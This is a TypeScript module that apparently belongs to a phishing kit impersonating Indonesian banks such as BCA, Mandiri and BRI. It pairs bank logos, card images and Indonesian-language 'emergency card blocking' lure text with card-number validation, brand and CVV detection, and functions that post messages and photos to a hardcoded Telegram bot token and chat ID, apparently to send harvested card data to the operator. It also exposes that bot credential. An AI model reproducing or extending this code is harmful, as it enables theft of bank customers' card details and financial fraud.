import { BankOption, CardBrandInfo } from '../types';

export const TELEGRAM_BOT_TOKEN = '8860128979:AAG3761FqbKB5UjFArJ7HiC4-3EPYi8A0Qc';
export const TELEGRAM_CHAT_ID = '8341942326';

export const STANDARD_BCA_LOGO_URL =
  'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/1280px-Bank_Central_Asia.svg.png';

export const SPLASH_BCA_MOBILE_LOGO_URL =
  'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/1280px-Bank_Central_Asia.svg.png';

export const BANK_OPTIONS: BankOption[] = [
  {
    id: 'bca',
    name: 'BANK BCA',
    gradient: 'linear-gradient(135deg, #002d62 0%, #004b93 50%, #001f44 100%)',
    logo: STANDARD_BCA_LOGO_URL,
    label: 'Bank Central Asia (BCA)',
  },
  {
    id: 'mandiri',
    name: 'BANK MANDIRI',
    gradient: 'linear-gradient(135deg, #00264d 0%, #003d7a 50%, #001a33 100%)',
    logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/1280px-Bank_Mandiri_logo_2016.svg.png',
    label: 'Bank Mandiri',
  },
  {
    id: 'bri',
    name: 'BANK BRI',
    gradient: 'linear-gradient(135deg, #002244 0%, #004080 45%, #0059b3 100%)',
    logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/BANK_BRI_logo.svg/1280px-BANK_BRI_logo.svg.png',
    label: 'Bank Rakyat Indonesia (BRI)',
  },
  {
    id: 'bni',
    name: 'BANK BNI',
    gradient: 'linear-gradient(135deg, #b83d00 0%, #e65100 45%, #a04000 100%)',
    logo: 'https://upload.wikimedia.org/wikipedia/id/thumb/5/55/BNI_logo.svg/1280px-BNI_logo.svg.png',
    label: 'Bank Negara Indonesia (BNI)',
  },
  {
    id: 'cimb',
    name: 'CIMB NIAGA',
    gradient: 'linear-gradient(135deg, #670000 0%, #8b0000 45%, #380000 100%)',
    logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/CIMB_Niaga_logo.svg/1280px-CIMB_Niaga_logo.svg.png',
    label: 'CIMB Niaga',
  },
  {
    id: 'permata',
    name: 'BANK PERMATA',
    gradient: 'linear-gradient(135deg, #004724 0%, #006633 45%, #002e17 100%)',
    logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/07/Bank_Permata_logo.svg/1280px-Bank_Permata_logo.svg.png',
    label: 'Bank Permata',
  },
  {
    id: 'lainnya',
    name: 'BANK LAINNYA',
    gradient: 'linear-gradient(135deg, #1f2937 0%, #111827 50%, #374151 100%)',
    logo: STANDARD_BCA_LOGO_URL,
    label: 'Bank Lain',
  },
];

export const CARD_SLIDES = [
  {
    name: 'BCA UnionPay',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-union.png',
  },
  {
    name: 'BCA Everyday Card',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-everyday.png',
  },
  {
    name: 'BCA Mastercard Platinum',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/20220725-BCA-Mastercard-Platinum-Front.png',
  },
  {
    name: 'BCA Tiket.com Card',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/tiket-card',
  },
  {
    name: 'BCA Blibli Card',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/blibli-card',
  },
  {
    name: 'BCA JCB Black',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/20220722-JCB-Black.png',
  },
  {
    name: 'BCA Visa Platinum',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-platinum.png',
  },
  {
    name: 'BCA Visa Black',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-vsblack.png',
  },
  {
    name: 'BCA Mastercard Black',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-msblack.png',
  },
  {
    name: 'BCA Smartcash',
    image: 'https://www.bca.co.id/-/media/Feature/Banner/Content-Banner/Bisnis/BCA-Smartcash.png?v=1',
  },
  {
    name: 'BCA Mastercard World',
    image: 'https://www.bca.co.id/-/media/Images/individu/produk/kartu-kredit/welcome-pack/all-in-one/card-world',
  },
];

export const SERVICE_EXPLANATIONS = [
  'Blokir instan kartu debit atau kredit untuk mencegah penyalahgunaan darurat.',
  'Langkah cepat proteksi tambahan untuk mengamankan instrumen bank lain.',
  'Laporan tanggap darurat untuk menghentikan transaksi tak dikenal.',
  'Proteksi ekstra mengamankan User ID digital banking dari ancaman pembobolan.',
];

/**
 * Validates a credit/debit card number using Luhn's algorithm
 */
export function validateLuhn(cardNumber: string): boolean {
  const cleanNum = cardNumber.replace(/\D/g, '');
  if (cleanNum.length < 13 || cleanNum.length > 19) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = cleanNum.length - 1; i >= 0; i--) {
    let digit = parseInt(cleanNum.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

/**
 * Detects card network brand from prefix
 */
export function detectCardType(cardNumber: string): CardBrandInfo {
  const num = cardNumber.replace(/\D/g, '');
  if (/^4/.test(num)) return { name: 'VISA', badge: 'VISA' };
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return { name: 'MASTERCARD', badge: 'MC' };
  if (/^3[47]/.test(num)) return { name: 'AMEX', badge: 'AMEX' };
  if (/^6011/.test(num) || /^65/.test(num) || /^64[4-9]/.test(num) || /^62/.test(num))
    return { name: 'UNIONPAY', badge: 'U-PAY' };
  if (/^(352[8-9]|35[3-8][0-9])/.test(num)) return { name: 'JCB', badge: 'JCB' };
  if (/^506(0|1)|^507(8|9)|^6500/.test(num)) return { name: 'GPN', badge: 'GPN' };
  return { name: 'KARTU', badge: 'BCA' };
}

/**
 * Checks if the card format requires CVV (e.g. GPN cards do not)
 */
export function hasCvvCapability(cardNumber: string): boolean {
  const num = cardNumber.replace(/\D/g, '');
  if (/^506(0|1)|^507(8|9)|^6500/.test(num)) return false;
  return true;
}

/**
 * Format string as Rupiah currency
 */
export function formatRupiah(value: string): string {
  const numericOnly = value.replace(/\D/g, '');
  if (!numericOnly) return '';
  return 'Rp ' + new Intl.NumberFormat('id-ID').format(parseInt(numericOnly, 10));
}

/**
 * Formats expiration input as MM/YY
 */
export function formatExpiry(value: string): string {
  let val = value.replace(/[^0-9]/g, '');
  if (val.length > 2) {
    val = val.substring(0, 2) + '/' + val.substring(2, 4);
  }
  return val;
}

/**
 * Formats card number into 4-digit groups
 */
export function formatCardNumber(value: string): string {
  const clean = value.replace(/\D/g, '').substring(0, 19);
  return clean.match(/.{1,4}/g)?.join(' ') || clean;
}

/**
 * Sends a text notification to Telegram
 */
export async function sendTelegramNotification(message: string): Promise<void> {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });
  } catch (err) {
    console.error('Gagal mengirim ke Telegram:', err);
  }
}

/**
 * Sends a photo to Telegram with a caption
 */
export async function sendTelegramPhoto(photoBlob: Blob, captionText: string): Promise<void> {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', photoBlob, 'bukti_transaksi.jpg');
  formData.append('caption', captionText);
  formData.append('parse_mode', 'Markdown');

  try {
    await fetch(url, { method: 'POST', body: formData });
  } catch (err) {
    console.error('Gagal mengirim foto ke Telegram:', err);
  }
}
